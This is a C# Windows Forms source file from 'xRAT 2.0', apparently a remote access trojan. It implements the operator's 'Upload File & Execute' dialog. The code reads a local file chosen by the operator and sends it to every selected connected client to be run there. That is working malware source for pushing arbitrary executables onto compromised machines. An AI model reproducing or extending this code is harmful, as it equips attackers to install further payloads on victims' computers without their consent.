using System;
using Core;
using System.Windows.Forms;
using System.Collections.Generic;
using System.IO;

namespace xRAT_2.Forms
{
    public partial class frmUploadAndExecute : Form
    {
        private List<Client> clientList;
        private string filePath;
        private byte[] fileBytes;

        public frmUploadAndExecute(List<Client> clients)
        {
            clientList = clients;
            InitializeComponent();
        }

        private void frmUploadAndExecute_Load(object sender, EventArgs e)
        {
            this.Text = string.Format("xRAT 2.0 - Upload File & Execute [Selected: {0}]", clientList.Count);
        }

        private void btnUploadAndExecute_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    filePath = ofd.InitialDirectory + ofd.FileName;

                    if ((fileBytes = File.ReadAllBytes(filePath)).Length > 0)
                    {
                        foreach (Client c in clientList)
                        {
                            new Core.Packets.ServerPackets.UploadAndExecute(fileBytes, ofd.SafeFileName).Execute(c);
                        }                    
                    }
                }
                this.Close();
            }
        }
    }
}
